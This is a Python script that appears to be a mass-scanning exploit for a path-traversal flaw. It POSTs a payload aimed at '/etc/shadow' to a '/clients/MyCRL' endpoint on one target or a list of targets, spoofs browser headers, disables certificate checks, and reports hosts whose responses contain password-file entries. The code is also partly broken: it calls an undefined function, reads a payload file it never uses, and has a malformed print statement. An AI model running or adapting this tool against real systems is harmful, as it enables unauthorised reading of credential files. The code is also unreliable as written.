import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

vuln = ['root:','nobody:']
  
with open("lfi.txt", 'r') as lfi:
    paths = lfi.readlines()

def make_request(url, payload=None, headers=None):
    try:
        response = requests.post(url,
                                 data=payload,
                                 headers=headers,
                                 verify=False)
        for word in vuln:
            if word in response.text:
                print(f"[+] {url} is vulnerable to {word}")
                juicy(url)
            else:
                print(f"[-] {url} is not vulnerable")
            
            
        print("Findings: {stripped}")
        print("------------------------")
    except requests.RequestException as e:
        print(f"Error making request to {url}: {e}")


def main():
    parser = argparse.ArgumentParser(description="HTTP Requester")
    parser.add_argument("-l",
                        metavar='filename',
                        type=str,
                        help="File containing list of HTTP/HTTPS targets")
    parser.add_argument("-t",
        metavar='target',
        type=str,
        help="HTTP/HTTPS target ex: https://example.com")
    args = parser.parse_args()

    headers = {
        "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Connection": "close"
    }

    payload = "aCSHELL/../../../../../../../etc/shadow"

    if args.t:
        try:
            if args.t.startswith('http://') or args.t.startswith('https://'):
                make_request(args.t + '/clients/MyCRL', payload=payload, headers=headers)
            else:
                print("Invalid url, please use http://example.com or https://example.com")
        except requests.RequestException as e:
            print(f'Error: {e}')
            

    if args.l:
        try:
            with open(args.l, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()
                    if url.startswith('http://') or url.startswith('https://'):
                        make_request(url + '/clients/MyCRL',
                                     payload=payload,
                                     headers=headers)
                    else:
                        print(f"Skipping invalid URL: {url}")
        except FileNotFoundError:
            print(f"Error: File '{args.l}' not found.")
    else:
        print(
            "Please provide a file containing list of HTTP/HTTPS targets using -l option."
        )


if __name__ == "__main__":
    main()
